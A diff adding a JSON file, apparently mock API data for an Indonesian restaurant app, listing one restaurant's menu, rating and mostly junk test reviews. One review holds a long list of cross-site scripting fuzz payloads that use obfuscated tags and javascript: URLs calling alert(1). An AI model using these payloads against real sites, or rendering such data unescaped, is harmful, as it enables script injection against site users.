@@ -1,0 +1,155 @@
+{
+    "error": false,
+    "message": "success",
+    "restaurant": {
+        "id": "rqdv5juczeskfw1e867",
+        "name": "Melting Pot",
+        "description": "Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. Aliquam lorem ante, dapibus in, viverra quis, feugiat a, tellus. Phasellus viverra nulla ut metus varius laoreet.",
+        "city": "Medan",
+        "address": "Jln. Pandeglang no 19",
+        "pictureId": "14",
+        "categories": [
+            {
+                "name": "Italia"
+            },
+            {
+                "name": "Modern"
+            }
+        ],
+        "menus": {
+            "foods": [
+                {
+                    "name": "Paket rosemary"
+                },
+                {
+                    "name": "Toastie salmon"
+                },
+                {
+                    "name": "Bebek crepes"
+                },
+                {
+                    "name": "Salad lengkeng"
+                }
+            ],
+            "drinks": [
+                {
+                    "name": "Es krim"
+                },
+                {
+                    "name": "Sirup"
+                },
+                {
+                    "name": "Jus apel"
+                },
+                {
+                    "name": "Jus jeruk"
+                },
+                {
+                    "name": "Coklat panas"
+                },
+                {
+                    "name": "Air"
+                },
+                {
+                    "name": "Es kopi"
+                },
+                {
+                    "name": "Jus alpukat"
+                },
+                {
+                    "name": "Jus mangga"
+                },
+                {
+                    "name": "Teh manis"
+                },
+                {
+                    "name": "Kopi espresso"
+                },
+                {
+                    "name": "Minuman soda"
+                },
+                {
+                    "name": "Jus tomat"
+                }
+            ]
+        },
+        "rating": 4.2,
+        "customerReviews": [
+            {
+                "name": "Ahmad",
+                "review": "Tidak rekomendasi untuk pelajar!",
+                "date": "13 November 2019"
+            },
+            {
+                "name": "asdss",
+                "review": "asdsad",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "csk",
+                "review": "dks",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "kcslk",
+                "review": "skdkdsk",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "kcslk",
+                "review": "skdkdsk",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "kcslk",
+                "review": "skdkdsk",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "sdkml",
+                "review": "kmv",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "sdk",
+                "review": "skd",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "nama",
+                "review": "Repiew",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "1234",
+                "review": "test",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "1234",
+                "review": "test",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "1234",
+                "review": "test again",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "dfdf",
+                "review": "dfsdge",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "a",
+                "review": "<marquee onStart marquee onStart=\"javascript:javascript:alert(1)\"></marquee onStart>\n<script onLoad script onLoad=\"javascript:javascript:alert(1)\"></script onLoad>\n<html onMouseOver html onMouseOver=\"javascript:javascript:alert(1)\"></html onMouseOver>\n<html onMouseEnter html onMouseEnter=\"javascript:parent.javascript:alert(1)\"></html onMouseEnter>\n<body onBeforeUnload body onBeforeUnload=\"javascript:javascript:alert(1)\"></body onBeforeUnload>\n<html onMouseDown html onMouseDown=\"javascript:javascript:alert(1)\"></html onMouseDown>\n<marquee onScroll marquee onScroll=\"javascript:javascript:alert(1)\"></marquee onScroll>\n<xml onPropertyChange xml onPropertyChange=\"javascript:javascript:alert(1)\"></xml onPropertyChange>\n<frameset onBlur frameset onBlur=\"javascript:javascript:alert(1)\"></frameset onBlur>\n<applet onReadyStateChange applet onReadyStateChange=\"javascript:javascript:alert(1)\"></applet onReadyStateChange>\n<svg onUnload svg onUnload=\"javascript:javascript:alert(1)\"></svg onUnload>\n<html onMouseOut html onMouseOut=\"javascript:javascript:alert(1)\"></html onMouseOut>\n<body onMouseMove body onMouseMove=\"javascript:javascript:alert(1)\"></body onMouseMove>\n<body onResize body onResize=\"javascript:javascript:alert(1)\"></body onResize>\n<object onError object onError=\"javascript:javascript:alert(1)\"></object onError>\n<body onPopState body onPopState=\"javascript:javascript:alert(1)\"></body onPopState>\n<html onMouseMove html onMouseMove=\"javascript:javascript:alert(1)\"></html onMouseMove>\n<applet onreadystatechange applet onreadystatechange=\"javascript:javascript:alert(1)\"></applet onreadystatechange>\n<body onpagehide body onpagehide=\"javascript:javascript:alert(1)\"></body onpagehide>\n<svg onunload svg onunload=\"javascript:javascript:alert(1)\"></svg onunload>\n<applet onerror applet onerror=\"javascript:javascript:alert(1)\"></applet onerror>\n<body onkeyup body onkeyup=\"javascript:javascript:alert(1)\"></body onkeyup>\n<body onunload body onunload=\"javascript:javascript:alert(1)\"></body onunload>\n<iframe onload iframe onload=\"javascript:javascript:alert(1)\"></iframe onload>\n<body onload body onload=\"javascript:javascript:alert(1)\"></body onload>\n<html onmouseover html onmouseover=\"javascript:javascript:alert(1)\"></html onmouseover>\n<object onbeforeload object onbeforeload=\"javascript:javascript:alert(1)\"></object onbeforeload>\n<body onbeforeunload body onbeforeunload=\"javascript:javascript:alert(1)\"></body onbeforeunload>\n<body onfocus body onfocus=\"javascript:javascript:alert(1)\"></body onfocus>\n<body onkeydown body onkeydown=\"javascript:javascript:alert(1)\"></body onkeydown>\n<iframe onbeforeload iframe onbeforeload=\"javascript:javascript:alert(1)\"></iframe onbeforeload>\n<iframe src iframe src=\"javascript:javascript:alert(1)\"></iframe src>\n<svg onload svg onload=\"javascript:javascript:alert(1)\"></svg onload>\n<html onmousemove html onmousemove=\"javascript:javascript:alert(1)\"></html onmousemove>\n<body onblur body onblur=\"javascript:javascript:alert(1)\"></body onblur>\n\\x3Cscript>javascript:alert(1)</script>\n'\"`><script>/* *\\x2Fjavascript:alert(1)// */</script>\n<script>javascript:alert(1)</script\\x0D\n<script>javascript:alert(1)</script\\x0A\n<script>javascript:alert(1)</script\\x0B\n<script charset=\"\\x22>javascript:alert(1)</script>\n<!--\\x3E<img src=xxx:x onerror=javascript:alert(1)> -->\n--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->\n--><!-- --\\x00> <img src=xxx:x onerror=javascript:alert(1)> -->\n--><!-- --\\x21> <img src=xxx:x onerror=javascript:alert(1)> -->\n--><!-- --\\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->\n`\"'><img src='#\\x27 onerror=javascript:alert(1)>\n<a href=\"javascript\\x3Ajavascript:alert(1)\" id=\"fuzzelement1\">test</a>\n\"'`><p><svg><script>a='hello\\x27;javascript:alert(1)//';</script></p>\n<a href=\"javas\\x00cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x07cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x0Dcript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x0Acript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x08cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x02cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x03cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x04cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x01cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x05cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x0Bcript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x09cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x06cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javas\\x0Ccript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<script>/* *\\x2A/javascript:alert(1)// */</script>\n<script>/* *\\x00/javascript:alert(1)// */</script>\n<style></style\\x3E<img src=\"about:blank\" onerror=javascript:alert(1)//></style>\n<style></style\\x0D<img src=\"about:blank\" onerror=javascript:alert(1)//></style>\n<style></style\\x09<img src=\"about:blank\" onerror=javascript:alert(1)//></style>\n<style></style\\x20<img src=\"about:blank\" onerror=javascript:alert(1)//></style>\n<style></style\\x0A<img src=\"about:blank\" onerror=javascript:alert(1)//></style>\n\"'`>ABC<div style=\"font-family:'foo'\\x7Dx:expression(javascript:alert(1);/*';\">DEF \n\"'`>ABC<div style=\"font-family:'foo'\\x3Bx:expression(javascript:alert(1);/*';\">DEF \n%253Cscript%253Ealert('XSS')%253C%252Fscript%253E\n<script>if(\"x\\\\xE1\\x96\\x89\".length==2) { javascript:alert(1);}</script>\n<script>if(\"x\\\\xE0\\xB9\\x92\".length==2) { javascript:alert(1);}</script>\n<script>if(\"x\\\\xEE\\xA9\\x93\".length==2) { javascript:alert(1);}</script>\n'`\"><\\x3Cscript>javascript:alert(1)</script>\n'`\"><\\x00script>javascript:alert(1)</script>\n\"'`><\\x3Cimg src=xxx:x onerror=javascript:alert(1)>\n\"'`><\\x00img src=xxx:x onerror=javascript:alert(1)>\n<script src=\"data:text/plain\\x2Cjavascript:alert(1)\"></script>\n<script src=\"data:\\xD4\\x8F,javascript:alert(1)\"></script>",
+                "date": "7 Juni 2021"
+            },
+            {
+                "name": "so",
+                "review": "iaoh",
+                "date": "7 Juni 2021"
+            }
+        ]
+    }
+}
